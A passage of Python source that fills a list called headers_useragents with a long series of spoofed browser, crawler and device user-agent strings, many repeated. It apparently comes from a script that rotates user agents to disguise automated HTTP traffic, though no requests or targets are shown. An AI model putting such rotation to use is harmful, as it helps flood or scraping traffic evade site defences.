                                    	headers_useragents.append('Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; Arachmo)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)')
                                    	headers_useragents.append('BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)')
                                    	headers_useragents.append('Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
                                    	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)')
                                    	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)')
                                    	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1')
                                    	headers_useragents.append('Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A')
                                    	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 3.55)')
                                    	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 2.00)')
                                    	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 1.00)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)')
                                    	headers_useragents.append('SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)')
                                    	headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
                                    	headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
                                    	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
                                    	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
                                    	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
                                    	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
                                    	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
                                    	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
                                    	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Googlebot/2.1 (http://www.googlebot.com/bot.html)')
                                    	headers_useragents.append('Opera/9.20 (Windows NT 6.0; U; en)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
                                    	headers_useragents.append('YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
                                    	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
                                    	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
                                    	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
                                    	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
                                    	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
                                    	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
                                    	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
                                    	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
                                    	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
                                    	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
                                    	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
                                    	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
                                    	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
                                    	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
                                    	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
                                    	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
                                    	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
